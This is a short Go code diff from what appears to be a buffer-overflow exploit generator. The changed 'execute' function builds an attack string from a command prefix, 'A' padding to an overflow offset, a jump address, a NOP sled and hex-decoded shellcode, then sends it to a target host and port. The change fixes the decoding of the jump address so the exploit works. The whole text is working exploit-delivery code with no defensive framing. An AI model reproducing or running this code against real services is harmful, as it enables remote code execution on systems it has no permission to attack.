@@ -207,7 +207,9 @@ func generate(c Config, off int, jmp string, bad string, ptype string, send bool
 func execute(c Config, e Exploit) {
 	fmt.Printf("Sending exploit to %s:%d..."+"\n", c.Host, c.Port)
 	decoded, _ := hex.DecodeString(e.Payload)
-	payload := fmt.Sprint(c.Cmd+strings.Repeat("A", e.Offset)+e.Jmp, strings.Repeat("\x90", 16)+string(decoded))
+	jmp := strings.ReplaceAll(e.Jmp, "\\x", "")
+	jmpDecoded, _ := hex.DecodeString(jmp)
+	payload := fmt.Sprint(c.Cmd+strings.Repeat("A", e.Offset)+string(jmpDecoded), strings.Repeat("\x90", 16)+string(decoded))
 	err := sendPayload(c, payload)
 	if err != nil {
 		log.Fatal(err)
